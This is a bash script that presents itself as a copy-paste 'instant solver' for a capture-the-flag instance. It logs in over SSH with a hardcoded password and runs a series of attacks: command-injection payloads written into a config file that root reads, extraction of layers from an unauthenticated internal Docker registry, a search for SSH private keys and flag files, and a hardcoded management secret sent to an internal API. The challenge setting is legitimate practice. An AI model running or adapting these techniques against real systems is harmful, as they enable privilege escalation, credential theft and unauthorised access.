#!/bin/bash
# INSTANT SOLVER FOR PORT 32964 - COPY PASTE THIS ENTIRE THING INTO KALI

sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no player@instance.ctf.tdho.st -p 32964 << 'ENDOFSCRIPT'

echo "=== RAPID ATTACK SEQUENCE ==="

# ATTACK 1: Try all known config formats
echo "[1] Brute force config formats..."
for cmd in "cat /root/flag.txt" "cat /etc/flag.txt" "FILE-READ:/root/flag.txt"; do
    echo "talldwarf-sync-command=$cmd" > /opt/mc/config/sync-request.conf
    sleep 2
    grep -r "TDHO{" /opt/mc /home/player /tmp 2>/dev/null && exit 0
done

# ATTACK 2: Extract sync-loop.sh from all registry images
echo "[2] Extracting from Docker registry..."
python3 << 'PYEND'
import urllib.request,json,gzip,io,tarfile,sys
REG="http://172.27.0.1:5000"
try:
    repos=json.load(urllib.request.urlopen(f"{REG}/v2/_catalog",timeout=10))
    for repo in repos.get("repositories",[]):
        try:
            tags=json.load(urllib.request.urlopen(f"{REG}/v2/{repo}/tags/list",timeout=5))
            for tag in tags.get("tags",[])[:2]:
                req=urllib.request.Request(f"{REG}/v2/{repo}/manifests/{tag}",headers={"Accept":"application/vnd.docker.distribution.manifest.v2+json"})
                manifest=json.load(urllib.request.urlopen(req,timeout=5))
                for layer in manifest.get("layers",[]):
                    try:
                        req2=urllib.request.Request(f"{REG}/v2/{repo}/blobs/{layer['digest']}",headers={"Accept":"application/octet-stream"})
                        data=urllib.request.urlopen(req2,timeout=10).read()
                        raw=gzip.decompress(data) if data[:2]==b"\x1f\x8b" else data
                        tf=tarfile.open(fileobj=io.BytesIO(raw))
                        for m in tf.getmembers():
                            if "sync-loop" in m.name and m.isfile():
                                content=tf.extractfile(m).read().decode("utf-8","replace")
                                print(f"\n{'='*70}\nFOUND: {m.name}\n{'='*70}\n{content}\n{'='*70}")
                                with open("/tmp/sync-loop.sh","w") as f: f.write(content)
                    except: pass
        except: pass
except: pass
PYEND

# If sync-loop.sh found, analyze it
if [ -f /tmp/sync-loop.sh ]; then
    echo "[+] sync-loop.sh extracted! Contents:"
    cat /tmp/sync-loop.sh
fi

# ATTACK 3: Search for SSH keys everywhere
echo "[3] Searching for SSH keys..."
find / -name "*.pem" -o -name "id_*" 2>/dev/null | head -10

# ATTACK 4: Check if flag is already readable somewhere
echo "[4] Direct flag search..."
find / -name "*flag*" -type f 2>/dev/null | while read f; do
    if [ -r "$f" ]; then
        echo "[*] Checking: $f"
        cat "$f" 2>/dev/null | grep -i "TDHO{" && exit 0
    fi
done

# ATTACK 5: Try to access Docker host with management secret
echo "[5] Testing management secret..."
SECRET="dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ"
curl -s -m 2 "http://172.27.0.1:8080/flag?secret=$SECRET" 2>/dev/null | grep -i "TDHO{"
curl -s -m 2 -H "Authorization: Bearer $SECRET" "http://172.27.0.1:8080/api/flag" 2>/dev/null | grep -i "TDHO{"

# ATTACK 6: Check all writable locations for root-created files
echo "[6] Checking for sync output..."
ls -lat /opt/mc/config/ /tmp/ /home/player/ 2>/dev/null | head -20

# ATTACK 7: Try command injection in config
echo "[7] Command injection attempt..."
echo 'talldwarf-sync-command=$(cat /root/flag.txt > /tmp/x.txt)' > /opt/mc/config/sync-request.conf
sleep 3
cat /tmp/x.txt 2>/dev/null | grep -i "TDHO{"

# ATTACK 8: Check .sync directory
echo "[8] Checking sync directory..."
ls -la /opt/mc/.sync/ 2>/dev/null
cat /opt/mc/.sync/* 2>/dev/null | grep -i "TDHO{"

# ATTACK 9: Monitor for new files created by root
echo "[9] Monitoring for new root files..."
echo "talldwarf-sync-command=FILE-READ:/root/flag.txt" > /opt/mc/config/sync-request.conf
sleep 5
find /opt/mc /home/player /tmp -type f -mmin -1 2>/dev/null | while read f; do
    echo "[*] New file: $f"
    cat "$f" 2>/dev/null | grep -i "TDHO{" && exit 0
done

echo ""
echo "=== MANUAL INVESTIGATION NEEDED ==="
echo "Check if sync-loop.sh was extracted above to understand config format"
echo "Time remaining: Check your instance timer"

ENDOFSCRIPT
